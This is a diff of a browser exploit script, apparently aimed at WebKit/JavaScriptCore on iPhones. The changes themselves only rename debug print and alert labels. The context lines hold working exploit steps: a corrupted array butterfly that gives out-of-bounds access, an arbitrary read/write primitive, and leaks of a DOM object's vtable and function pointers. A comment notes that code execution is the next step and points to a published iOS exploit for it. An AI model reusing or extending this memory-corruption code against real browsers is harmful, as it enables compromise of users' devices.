@@ -436,7 +436,7 @@ for (var i=0; i<ZONE_SPAM; i++) {
 // doubles
 unboxed[ZONE] = 1.1;
 // print the newly allocated butterfly of unboxed object
-print("exploit: " + bh.f64ToStr(fakeDoubleArr[1]));
+print("Buttefly: " + bh.f64ToStr(fakeDoubleArr[1]));
 // now we are going to shift unboxed butterfly by +0x10 relative to
 // the original one and craft the buterfly header at +8,
 // set its length to 0x10001, so we get  out of bound read/write into
@@ -478,7 +478,7 @@ for (var i=0; i<ZONE*4; i++) {
 // arbitrary read/write the same way as in Safari exploit
 // [1] https://github.com/phoenhex/files/tree/master/exploits/ios-11.3.1
 // by @_niklasb.
-print("magic: " + magicIdx.toString(16));
+print("Magic: " + magicIdx.toString(16));
 let rw = new iRW(boxed, unboxed, magicIdx);
 // make sure our arbitrary read/write works
 print("R/W: " + rw.test());
@@ -486,12 +486,12 @@ print("R/W: " + rw.test());
 // authenticated pointer if you are on XS.
 var wrapper = document.createElement('div')
 var el = rw.read64AtObj(wrapper, 0x18);
-alert("el: " + bh.f64ToStr(el));
+alert("Exploit: " + bh.f64ToStr(el));
 var vtable = rw.read64(el);
-alert("vtable: " + bh.f64ToStr(vtable));
+alert("Vtable: " + bh.f64ToStr(vtable));
 let fn = rw.read64(vtable);
 fn = rw.read64(vtable);
-alert("fn: " + bh.f64ToStr(fn));
+alert("Fn: " + bh.f64ToStr(fn));
 let inst = rw.read64(fn);
 // to get code execution refer to [1] for iPhones up to XS, 
 // XS models will require a different approach ...
